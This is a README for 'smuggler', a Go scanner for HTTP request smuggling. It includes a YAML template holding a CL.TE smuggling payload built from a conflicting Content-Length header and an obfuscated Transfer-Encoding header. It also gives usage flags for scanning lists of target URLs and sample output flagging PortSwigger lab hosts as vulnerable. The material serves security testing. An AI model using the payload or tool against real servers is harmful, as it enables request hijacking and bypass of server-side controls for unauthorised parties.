# smuggler
net/http makes it very challenging to send a request with malformed or duplicate headers. So for this application, it is more practical to parse a template and write it to a socket. This makes it simple to add your own payloads and may be useful for other things than request smuggling for ease of creating templates by copy/pasting from Burp.  
  
I took some ideas from this article https://www.synopsys.com/blogs/software-security/fuzzing-test-cases-not-all-random/ about the structure of the program. Separating the application into distinct sections being poet, courier, and oracle help make the code more reusable.



Example template:
```
Match: Unrecognized method GPOST
Request: |+
  POST {{.Path}} HTTP/1.1
  Host: {{.Host}}
  Content-Type: application/x-www-form-urlencoded
  Content-length: 4
  Transfer-Encoding: chunked
  Transfer-encoding: cow

  5c
  GPOST / HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 15

  x=1
  0


```

Usage:
```
$ ./smuggler -h
Usage of ./smuggler:
  -header string
    	Custom header to add to requests, example: '-header "User-Agent: garlic0x1"'
  -proxy string
    	Set the environment proxy, for example: http://example.com:8080
  -templates string
    	Directory of YAML templates to test (default "templates/")
  -threads int
    	Number of concurrent targets to test (default 5)
  -timeout int
    	Timeout (default 10)
  -tries int
    	Number of requests to send to test each template (default 5)
  -u string
    	Target URL
  -urls string
    	List of URLs
```

Example test on Portswigger labs:
```
$ ./smuggler -urls targets.test 
https://ace01f7b1ead19f2c0064c7300d500e6.web-security-academy.net/ is vulnerable, payload: templates/clte.yaml
https://ace01f7b1ead19f2c0064c7300d500e6.web-security-academy.net/ is vulnerable, payload: templates/diffclte.yaml
https://accb1f2b1ff036edc0495a6d00cf00be.web-security-academy.net/ is vulnerable, payload: templates/obfuscateTE.yaml
https://accb1f2b1ff036edc0495a6d00cf00be.web-security-academy.net/ is vulnerable, payload: templates/tecl.yaml
```
